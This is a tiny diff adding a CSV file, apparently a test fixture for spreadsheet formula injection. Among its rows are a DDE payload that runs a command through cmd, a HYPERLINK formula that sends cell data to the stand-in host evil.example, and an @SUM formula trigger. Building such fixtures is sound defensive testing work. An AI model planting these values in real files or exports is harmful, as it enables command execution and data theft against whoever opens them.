@@ -1,0 +1,5 @@
+Name,Sales
+"=cmd|' /C calc'!A0",10
+=HYPERLINK("http://evil.example/?"&A1;"Click"),20
+North,30
+@SUM(1+9),40
